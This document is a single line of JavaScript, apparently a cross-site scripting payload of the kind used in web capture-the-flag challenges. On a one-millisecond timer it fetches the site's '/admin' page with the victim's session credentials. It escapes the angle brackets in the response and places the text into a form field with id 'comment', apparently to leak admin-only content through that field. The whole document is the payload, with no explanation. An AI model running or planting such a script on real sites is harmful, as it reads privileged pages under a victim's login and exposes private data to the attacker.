setInterval(() => {fetch("/admin", {"credentials": "include"}).then(res => res.text()).then(x => {document.getElementById("comment").value = x.replaceAll("<", "&lt;").replaceAll(">", "&gt;");})}, 1);
